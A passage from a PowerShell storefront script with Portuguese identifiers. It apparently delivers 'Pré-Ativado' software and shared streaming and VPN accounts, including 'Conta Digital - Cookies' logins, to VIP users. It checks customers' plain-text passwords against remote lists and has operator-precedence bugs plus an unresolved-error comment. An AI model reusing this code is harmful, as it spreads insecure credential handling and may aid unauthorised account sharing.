                       } elseif ($categoria_atual_produto -eq "Softwares e Licenças" -and $nome_atual_produto -eq $produto_atual -and $metodo_atual_produto -eq "Pré-Ativado") {
                            
                           # Produto encontrado, armazenar informações
                           $produto_scriptmodding_softwares_info = @{
                                "id" = $campos[0].Trim()
                                "categoria_produto" = $campos[1].Trim()
                                "nome_produto" = $campos[2].Trim()
                                "metodo_ativacao" = $campos[3].Trim()
                                "usuario_atual_produto" = $campos[4].Trim()
                                "senha_atual_produto" = $campos[5].Trim()
                                "ano_produto" = $campos[6].Trim()
                                "versao_atual" = $campos[7].Trim()
                                "versao_disponivel" = $campos[8].Trim()
                                "sistema_operacional" = $campos[9].Trim()
                                "compatibilidade_dispositivos" = $campos[10].Trim()
                                "duracao_plano" = $campos[11].Trim()
                                "detalhes_adicionais" = $campos[12].Trim()
                                "instrucoes_usoativacao" = $campos[13].Trim()
                                "qtd_installdisp_simult" = $campos[14].Trim()
                                "qtd_acessdisp_simult" = $campos[15].Trim()
                                "duracao_garantia_suporte" = $campos[16].Trim()
                                "status_atualizacao_renovacao" = $campos[17].Trim()
                                "processos_produto" = $campos[18].Trim()
                                "links_produto" = $campos[19].Trim()
                                "localizacao_produto" = $campos[20].Trim()
                                "link_tutorial_ativacao" = $campos[21].Trim()
                                "link_imagemprintconta" = $campos[22].Trim()
                                "tempo_espera_entrega" = $campos[23].Trim()
                                "status_disponibilidade_entrega" = $campos[24].Trim()
                                "disponibilidade_produto" = $campos[25].Trim()
                            }

                            break

                       } elseif ($categoria_atual_produto -eq "Streaming" -and $nome_atual_produto -eq $produto_atual -and $metodo_atual_produto -eq $metodo_atual) {
                            
                            # Produto encontrado, armazenar informações
                            $produto_digital_streaming_info = @{
                                "id" = $campos[0].Trim()
                                "categoria_produto" = $campos[1].Trim()
                                "nome_produto" = $campos[2].Trim()
                                "metodo_ativacao" = $campos[3].Trim()
                                "usuario_atual_produto" = $campos[4].Trim()
                                "senha_atual_produto" = $campos[5].Trim()
                                "duracao_plano" = $campos[6].Trim()
                                "detalhes_adicionais" = $campos[7].Trim()
                                "tipo_conta" = $campos[8].Trim()
                                "instrucoes_usoativacao" = $campos[9].Trim()
                                "qtd_telas" = $campos[10].Trim()
                                "compatibilidade_dispositivos" = $campos[11].Trim()
                                "qtd_acessdisp_simult" = $campos[12].Trim()
                                "regras_uso" = $campos[13].Trim()
                                "dias_garantia_suporte" = $campos[14].Trim()
                                "status_renovacao" = $campos[15].Trim()
                                "link_assinatura" = $campos[16].Trim()
                                "link_codigo_ativacao" = $campos[17].Trim()
                                "link_tutorial_assinatura" = $campos[18].Trim()
                                "usuario_assinatura" = $campos[19].Trim()
                                "senha_assinatura" = $campos[20].Trim()
                                "tela_pinlock" = $campos[21].Trim()
                                "link_imagemprintconta" = $campos[22].Trim()
                                "tempo_espera_entrega" = $campos[23].Trim()
                                "status_disponibilidade_entrega" = $campos[24].Trim()
                                "disponibilidade_produto" = $campos[25].Trim()
                            }
                            
                            break 

                       } elseif ($categoria_atual_produto -eq "VPNs" -and $nome_atual_produto -eq $produto_atual -and $metodo_atual_produto -eq $metodo_atual) {
                                
                           # Produto encontrado, armazenar informações
                           $produto_digital_vpns_info = @{
                                "id" = $campos[0].Trim()
                                "categoria_produto" = $campos[1].Trim()
                                "nome_produto" = $campos[2].Trim()
                                "metodo_ativacao" = $campos[3].Trim()
                                "usuario_atual_produto" = $campos[4].Trim()
                                "senha_atual_produto" = $campos[5].Trim()
                                "duracao_plano" = $campos[6].Trim()
                                "detalhes_adicionais" = $campos[7].Trim()
                                "tipo_conta" = $campos[8].Trim()
                                "instrucoes_usoativacao" = $campos[9].Trim()
                                "sistema_operacional" = $campos[10].Trim()
                                "compatibilidade_dispositivos" = $campos[11].Trim()
                                "qtd_acessdisp_simult" = $campos[12].Trim()
                                "regras_uso" = $campos[13].Trim()
                                "dias_garantia_suporte" = $campos[14].Trim()
                                "status_renovacao" = $campos[15].Trim()
                                "link_assinatura" = $campos[16].Trim()
                                "link_codigo_ativacao" = $campos[17].Trim()
                                "link_tutorial_assinatura" = $campos[18].Trim()
                                "usuario_assinatura" = $campos[19].Trim()
                                "senha_assinatura" = $campos[20].Trim()
                                "link_imagemprintconta" = $campos[21].Trim()
                                "tempo_espera_entrega" = $campos[22].Trim()
                                "status_disponibilidade_entrega" = $campos[23].Trim()
                                "disponibilidade_produto" = $campos[24].Trim()
                           }
                           
                           break 
                       }
                        
                    } elseif ($usuario_atual_produto -eq "Nenhum" -and $senha_atual_produto -eq "Nenhum" -and $metodo_atual_produto -eq $metodo_atual -and $plano_conta_atual -eq "VIP") {
                        
                        if ($categoria_atual_produto -eq "Softwares e Licenças" -and $nome_atual_produto -eq $produto_atual -and $metodo_atual_produto -eq "Pré-Ativado") { 

                            # Produto encontrado, armazenar informações
                            $produto_scriptmodding_softwares_info = @{
                                "id" = $campos[0].Trim()
                                "categoria_produto" = $campos[1].Trim()
                                "nome_produto" = $campos[2].Trim()
                                "metodo_ativacao" = $campos[3].Trim()
                                "usuario_atual_produto" = $campos[4].Trim()
                                "senha_atual_produto" = $campos[5].Trim()
                                "ano_produto" = $campos[6].Trim()
                                "versao_atual" = $campos[7].Trim()
                                "versao_disponivel" = $campos[8].Trim()
                                "sistema_operacional" = $campos[9].Trim()
                                "compatibilidade_dispositivos" = $campos[10].Trim()
                                "duracao_plano" = $campos[11].Trim()
                                "detalhes_adicionais" = $campos[12].Trim()
                                "instrucoes_usoativacao" = $campos[13].Trim()
                                "qtd_installdisp_simult" = $campos[14].Trim()
                                "qtd_acessdisp_simult" = $campos[15].Trim()
                                "duracao_garantia_suporte" = $campos[16].Trim()
                                "status_atualizacao_renovacao" = $campos[17].Trim()
                                "processos_produto" = $campos[18].Trim()
                                "links_produto" = $campos[19].Trim()
                                "localizacao_produto" = $campos[20].Trim()
                                "link_tutorial_ativacao" = $campos[21].Trim()
                                "link_imagemprintconta" = $campos[22].Trim()
                                "tempo_espera_entrega" = $campos[23].Trim()
                                "status_disponibilidade_entrega" = $campos[24].Trim()
                                "disponibilidade_produto" = $campos[25].Trim()
                            }

                            break

                        } elseif ($categoria_atual_produto -eq "Streaming" -and $nome_atual_produto -eq $produto_atual -and $metodo_atual_produto -eq "Conta Digital - Pública" -or $metodo_atual_produto -eq "Conta Digital - Cookies") {
                            
                            # Produto encontrado, armazenar informações
                            $produto_digital_streaming_info = @{
                                "id" = $campos[0].Trim()
                                "categoria_produto" = $campos[1].Trim()
                                "nome_produto" = $campos[2].Trim()
                                "metodo_ativacao" = $campos[3].Trim()
                                "usuario_atual_produto" = $campos[4].Trim()
                                "senha_atual_produto" = $campos[5].Trim()
                                "duracao_plano" = $campos[6].Trim()
                                "detalhes_adicionais" = $campos[7].Trim()
                                "tipo_conta" = $campos[8].Trim()
                                "instrucoes_usoativacao" = $campos[9].Trim()
                                "qtd_telas" = $campos[10].Trim()
                                "compatibilidade_dispositivos" = $campos[11].Trim()
                                "qtd_acessdisp_simult" = $campos[12].Trim()
                                "regras_uso" = $campos[13].Trim()
                                "dias_garantia_suporte" = $campos[14].Trim()
                                "status_renovacao" = $campos[15].Trim()
                                "link_assinatura" = $campos[16].Trim()
                                "link_codigo_ativacao" = $campos[17].Trim()
                                "link_tutorial_assinatura" = $campos[18].Trim()
                                "usuario_assinatura" = $campos[19].Trim()
                                "senha_assinatura" = $campos[20].Trim()
                                "tela_pinlock" = $campos[21].Trim()
                                "link_imagemprintconta" = $campos[22].Trim()
                                "tempo_espera_entrega" = $campos[23].Trim()
                                "status_disponibilidade_entrega" = $campos[24].Trim()
                                "disponibilidade_produto" = $campos[25].Trim()
                            }

                            break

                        } elseif ($categoria_atual_produto -eq "VPNs" -and $nome_atual_produto -eq $produto_atual -and $metodo_atual_produto -eq "Conta Digital - Pública" -or $metodo_atual_produto -eq "Conta Digital - Cookies") {
                           
                           # Produto encontrado, armazenar informações
                           $produto_digital_vpns_info = @{
                                "id" = $campos[0].Trim()
                                "categoria_produto" = $campos[1].Trim()
                                "nome_produto" = $campos[2].Trim()
                                "metodo_ativacao" = $campos[3].Trim()
                                "usuario_atual_produto" = $campos[4].Trim()
                                "senha_atual_produto" = $campos[5].Trim()
                                "duracao_plano" = $campos[6].Trim()
                                "detalhes_adicionais" = $campos[7].Trim()
                                "tipo_conta" = $campos[8].Trim()
                                "instrucoes_usoativacao" = $campos[9].Trim()
                                "sistema_operacional" = $campos[10].Trim()
                                "compatibilidade_dispositivos" = $campos[11].Trim()
                                "qtd_acessdisp_simult" = $campos[12].Trim()
                                "regras_uso" = $campos[13].Trim()
                                "dias_garantia_suporte" = $campos[14].Trim()
                                "status_renovacao" = $campos[15].Trim()
                                "link_assinatura" = $campos[16].Trim()
                                "link_codigo_ativacao" = $campos[17].Trim()
                                "link_tutorial_assinatura" = $campos[18].Trim()
                                "usuario_assinatura" = $campos[19].Trim()
                                "senha_assinatura" = $campos[20].Trim()
                                "link_imagemprintconta" = $campos[21].Trim()
                                "tempo_espera_entrega" = $campos[22].Trim()
                                "status_disponibilidade_entrega" = $campos[23].Trim()
                                "disponibilidade_produto" = $campos[24].Trim()
                           }
                           
                           break

                        }
                    }
                }
            }

            # Se o usuário foi encontrado, não precisa verificar outros links
            if ($produto_digital_softwares_info -or $produto_chaveserial_softwares_info -or $produto_digital_streaming_info -or $produto_digital_vpns_info) {
                break
            }

        }

        foreach ($url in $urls_usuario) {
            try {
                # Obter o conteúdo do arquivo
                $conteudo_usuario = Invoke-RestMethod -Uri $url -ErrorAction Stop
            } catch {
                Write-Host "Erro ao acessar a URL: $url" -ForegroundColor Red
                continue
            }
        
            # Verificar se o conteúdo está vazio
            #if ([string]::IsNullOrWhiteSpace($conteudo_usuario)) {
                #Write-Host "Conteúdo da URL $url está vazio ou não pôde ser obtido." -ForegroundColor Yellow
                #continue
            #}

            # Encontrar os dados do usuário atual
            $usuario_atual = $UsuarioAtual
            $senha_atual = $SenhaAtual

            $linhas = $conteudo_usuario -split "`n"
            
            foreach ($linha in $linhas) {
                
                $campos = $linha -split "\|"

                # Verificar se há pelo menos dois campos
                if ($campos.Count -ge 3) {
                    
                    $usuario_atual_arquivo = $campos[1].Trim()
                    $senha_atual_arquivo = $campos[2].Trim()
                    $plano_conta_arquivo = $campos[8].Trim()

                    if ($usuario_atual -eq $usuario_atual_arquivo -and $senha_atual -eq $senha_atual_arquivo -and $plano_conta_atual -eq $plano_conta_arquivo) {
                        
                        # Usuário encontrado, armazenar informações
                        $usuario_info = @{
                            "id" = $campos[0].Trim()
                            "usuario" = $campos[1].Trim()
                            "senha" = $campos[2].Trim()
                            "produtos" = $campos[3].Trim()
                            "duracao_plano" = $campos[4].Trim()
                            "data_inicio" = $campos[5].Trim()
                            "data_termino" = $campos[6].Trim()
                            "status_pagamento" = $campos[7].Trim()
                            "tipo_plano" = $campos[8].Trim()
                        }
                        
                        break
                    } 
                }
            }

            # Se o usuário foi encontrado, não precisa verificar outros links
            if ($usuario_info) {
                break
            }
        }

                if ($usuario_info) {
                    
                    # Analisar produtos e agrupar por método
                    $produtos = $usuario_info["produtos"] -split ":"
                    
                    # Limpar a lista de produtos disponíveis
                    $produtosctdigitalDisponiveis = $null

                    $data_atual_ctdigital = Get-Date

                    foreach ($produto in $produtos) {

                        $detalhes_produto = $produto -split ","          

                        $nome_produto = $detalhes_produto[0].Trim()
                        $categoria_produto = $detalhes_produto[1].Trim()
                        $metodo_ativacao_produto = $detalhes_produto[2].Trim()
                        $tipo_plano_produto = $detalhes_produto[2].Trim()
                        
                        if ($nome_produto -eq $produto_atual -and $categoria_produto -eq $categoria_atual -and $metodo_ativacao_produto -eq $metodo_atual) {
                           
                            if ($detalhes_produto[7].Trim() -eq "Nenhum"){
                                $data_termino_ctdigital = "Nenhum"
                            } else {
                                try {
                                    $data_termino_ctdigital = [DateTime]::ParseExact($detalhes_produto[7].Trim(), "dd/MM/yyyy", $null)
                                } catch {
                                    $data_termino_ctdigital = $null
                                }
                            }

                            $dias_restantes = if ($data_termino_ctdigital -eq "Nenhum") { 
                                "Vitalício"
                            } elseif ($data_termino_ctdigital -lt $data_atual_ctdigital) {
                                "Nenhum"
                            } elseif (($data_termino_ctdigital - $data_atual_ctdigital).Days -eq 0) {
                                "Último Dia"
                            } else {
                                ($data_termino_ctdigital - $data_atual_ctdigital).Days
                            }

                            # Adicionar o produto diretamente à lista de produtos disponíveis
                            $produtosctdigitalDisponiveis = @{
                                "nome_produto" = $nome_produto
                                "categoria_produto" = $categoria_produto
                                "metodo_ativacao_produto" = $metodo_ativacao_produto
                                "qtdv_produto_anterior" = $detalhes_produto[3].Trim()
                                "qtdv_produto_atualizado" = $detalhes_produto[4].Trim()
                                "duracao_plano" = $detalhes_produto[5].Trim()
                                "data_inicio_ctdigital" = $detalhes_produto[6].Trim()
                                "data_termino_ctdigital" = $detalhes_produto[7].Trim()
                                "status_pagamento" = $detalhes_produto[8].Trim()
                                "dias_restantes_ctdigital" = $dias_restantes
                            }

                            break
                                
                            
                        } else {
                            
                            if($metodo_atual -eq "Pré-Ativado" -and $usuario_info["tipo_plano"] -eq "VIP") {

                                $nome_produto_scriptmodding_vip_disponivel = @(
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["nome_produto"] } 
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $categoria_produto_scriptmodding_vip_disponivel = @(
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["categoria_produto"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $metodo_ativacao_produto_scriptmodding_vip_disponivel = @(
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["metodo_ativacao"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1
                                
                                $produtosctdigitalDisponiveis = @{
                                    "nome_produto" = "$nome_produto_scriptmodding_vip_disponivel"
                                    "categoria_produto" = "$categoria_produto_scriptmodding_vip_disponivel"
                                    "metodo_ativacao_produto" = "$metodo_ativacao_produto_scriptmodding_vip_disponivel"
                                    "qtdv_produto_anterior" = "Ilimitado"
                                    "qtdv_produto_atualizado" = "Ilimitado"
                                    "duracao_plano" = "Vitalício"
                                    "data_inicio_ctdigital" = "Nenhum"
                                    "data_termino_ctdigital" = "Nenhum"
                                    "status_pagamento" = "Aprovado"
                                    "dias_restantes_ctdigital" = "Vitalício"
                                }

                                break

                            } elseif($metodo_atual -eq "Conta Digital - Pública" -or $metodo_atual -eq "Conta Digital - Cookies" -and $usuario_info["tipo_plano"] -eq "VIP") {
                                
                                $nome_produto_streaming_vpn_vip_disponivel = @(
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["nome_produto"] }    
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["nome_produto"] }  
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $categoria_produto_streaming_vpn_vip_disponivel = @(
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["categoria_produto"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["categoria_produto"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $metodo_ativacao_produto_streaming_vpn_vip_disponivel = @(
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["metodo_ativacao"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["metodo_ativacao"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtosctdigitalDisponiveis = @{
                                    "nome_produto" = "$nome_produto_streaming_vpn_vip_disponivel"
                                    "categoria_produto" = "$categoria_produto_streaming_vpn_vip_disponivel"
                                    "metodo_ativacao_produto" = "$metodo_ativacao_produto_streaming_vpn_vip_disponivel"
                                    "qtdv_produto_anterior" = "Ilimitado"
                                    "qtdv_produto_atualizado" = "Ilimitado"
                                    "duracao_plano" = "Vitalício"
                                    "data_inicio_ctdigital" = "Nenhum"
                                    "data_termino_ctdigital" = "Nenhum"
                                    "status_pagamento" = "Aprovado"
                                    "dias_restantes_ctdigital" = "Vitalício"
                                }

                                break
                            }

                        }

                        # Verifica se o produto foi definido antes de adicionar à lista
                        if ($produtosctdigitalDisponiveis) {
                            break
                        }
                    }

                    if ($produtosctdigitalDisponiveis -ne $null -and $produtosctdigitalDisponiveis.Count -gt 0) {

                        foreach ($produtoctdigitalDisponivel in $produtosctdigitalDisponiveis) {
                           # resolver esse erro!
                           if ($produtoctdigitalDisponivel["data_termino_ctdigital"] -ne "Nenhum" -and $data_atual_ctdigital -gt $data_termino_ctdigital) {

                                MostrarCabecalhoRenovacao
                                MostrarMenuRenovacao -UsuarioAtual $UsuarioAtual -SenhaAtual $SenhaAtual -CategoriaEscolhida $CategoriaEscolhida -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -produtosctdigitalDisponiveis $produtosctdigitalDisponiveis -DataAtual $DataAtual -DataTermino $DataTermino -ProdutosMetodoLiberado $ProdutosMetodoLiberado

                            } else {

                                # Pré-Ativado (Softwares e Licenças) e Chave/Serial (Softwares e Licenças) 
                          
                                # - Detalhes Produto
                        
                                $produtoctdigital_qtd_installdisp_simult = @(
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["qtd_installdisp_simult"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                # - Detalhes Suporte

                                $produtoctdigital_duracao_garantia_suporte = @(
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["duracao_garantia_suporte"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_status_atualizacao_renovacao = @(
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["status_atualizacao_renovacao"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                # - Links Produto (Processos, instalação/desisnt e localização)
                        
                                $produtoctdigital_processos_produto = @(
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["processos_produto"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["processos_produto"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1
                                
                                $produtoctdigital_links_produto = @(
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["links_produto"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["links_produto"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1
                                
                                $produtoctdigital_localizacao_produto = @(
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["localizacao_produto"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["localizacao_produto"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                # Conta Digital, Chave/Serial e Pré-Ativado (Softwares e Licenças)                    

                                # - Detalhes Produto

                                $produtoctdigital_ano_produto = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["ano_produto"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["ano_produto"] }
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["ano_produto"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1
                        
                                $produtoctdigital_versao_atual = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["versao_atual"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["versao_atual"] }
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["versao_atual"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_versao_disponivel = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["versao_disponivel"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["versao_disponivel"] }
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["versao_disponivel"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_sistema_operacional = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["sistema_operacional"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["sistema_operacional"] }
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["sistema_operacional"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["sistema_operacional"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_capacidade_armazenamento = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["capacidade_armazenamento"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["capacidade_armazenamento"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_qtd_acessusuarios_simult = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["qtd_acessusuarios_simult"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["qtd_acessusuarios_simult"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1
                        
                                # - Dados de Acesso

                                $produtoctdigital_usuario = @(
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["usuario_assinatura"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_chavekey = @(
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["chave_key"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                # - Links Produto
                         
                                $produtoctdigital_link_chave = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["link_chave"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["link_chave"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1
                        
                                $produtoctdigital_link_programa = @(
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["link_programa"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1 
                                 

                                # Conta Digital (Software e Licenças, Streaming e VPNS) / Chave/Serial e Pré-Ativado (Software e Licenças)

                                # - Detalhes Produto

                                $produtoctdigital_tipo_conta = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["tipo_conta"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["tipo_conta"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["tipo_conta"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["tipo_conta"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_qtd_telas = @(
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["qtd_telas"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_compatibilidade_dispositivos = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["compatibilidade_dispositivos"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["compatibilidade_dispositivos"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["compatibilidade_dispositivos"] }
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["compatibilidade_dispositivos"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["compatibilidade_dispositivos"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_qtd_acessdisp_simult = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["qtd_acessdisp_simult"] }
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["qtd_acessdisp_simult"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["qtd_acessdisp_simult"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["qtd_acessdisp_simult"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                # - Detalhes Suporte

                                $produtoctdigital_dias_garantia_suporte = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["dias_garantia_suporte"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["dias_garantia_suporte"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["dias_garantia_suporte"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["dias_garantia_suporte"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_status_renovacao = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["status_renovacao"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["status_renovacao"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["status_renovacao"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["status_renovacao"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                # - Entrega do Produto
    
                                $produtoctdigital_tempoesperaentrega = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["tempo_espera_entrega"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["tempo_espera_entrega"] }
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["tempo_espera_entrega"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["tempo_espera_entrega"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["tempo_espera_entrega"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1
  
                                $produtoctdigital_statusdisponibilidade = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["status_disponibilidade_entrega"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["status_disponibilidade_entrega"] }
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["status_disponibilidade_entrega"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["status_disponibilidade_entrega"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["status_disponibilidade_entrega"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_disponibilidadeproduto = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["disponibilidade_produto"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["disponibilidade_produto"] }
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["disponibilidade_produto"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["disponibilidade_produto"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["disponibilidade_produto"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                # - Benefícios, Instruções e Regras de Uso

                                $produtoctdigital_beneficios = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["detalhes_adicionais"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["detalhes_adicionais"] }
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["detalhes_adicionais"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["detalhes_adicionais"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["detalhes_adicionais"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_regrasuso = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["regras_uso"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["regras_uso"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["regras_uso"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["regras_uso"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_instrucoes_usoativacao = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["instrucoes_usoativacao"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["instrucoes_usoativacao"] }
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["instrucoes_usoativacao"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["instrucoes_usoativacao"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["instrucoes_usoativacao"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1
                        
                                # - Dados de Acesso

                                $produtoctdigital_usuarioassinatura = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["usuario_assinatura"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["usuario_assinatura"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["usuario_assinatura"] }
